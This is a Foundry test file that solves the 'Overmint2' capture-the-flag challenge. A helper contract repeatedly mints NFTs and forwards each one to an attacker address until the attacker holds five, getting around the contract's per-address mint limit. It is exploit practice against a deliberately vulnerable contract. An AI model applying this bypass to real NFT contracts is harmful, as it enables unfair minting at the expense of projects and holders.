// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint2} from "src/CTFs/Overmint2.sol";





contract Overmint2Attacker is Test {

    AttackerContract2 attackerContract2;
    Overmint2 victim;

    address public attacker = address(0x10);

    function setUp() external {
        attackerContract2 = new AttackerContract2();
        victim = new Overmint2();
    }


    function test_AttackerContract2() external{
        console.log("address(attacker)",address(attacker));
        console.log("Overmint2Attacker",address(attackerContract2));
        console.log("victim",address(victim));


        vm.startPrank(attacker);

        // set the AttackerContract2 can control all the attacker's nft
        victim.setApprovalForAll(address(attackerContract2),true);

        console.log(victim.balanceOf(attacker));

        // attacking....
        attackerContract2.callVictimsMint(address(victim));


        
        require(victim.success());
        vm.stopPrank();
        
    }


}

contract AttackerContract2 {

    // uint256[] private tokenIds;

    function callVictimsMint(address victimsAddress) external {
        
        Overmint2(victimsAddress).mint();

        while(Overmint2(victimsAddress).balanceOf(msg.sender) < 5){
            console.log("test");

            // each time received the nft, directly send to the attacker
            uint256 tokenId = Overmint2(victimsAddress).totalSupply();
            Overmint2(victimsAddress).transferFrom(address(this),msg.sender,tokenId);
            
            // tokenIds.push(tokenId);
            
            Overmint2(victimsAddress).mint();
        }

        // // transfer the nft in attacker wallet to the attackeContract address
        // while(tokenIds.length >0){
            
        //     Overmint2(victimsAddress).transferFrom(msg.sender,address(this),tokenIds[tokenIds.length-1]);
        //     tokenIds.pop();
        // }

    }
    
}
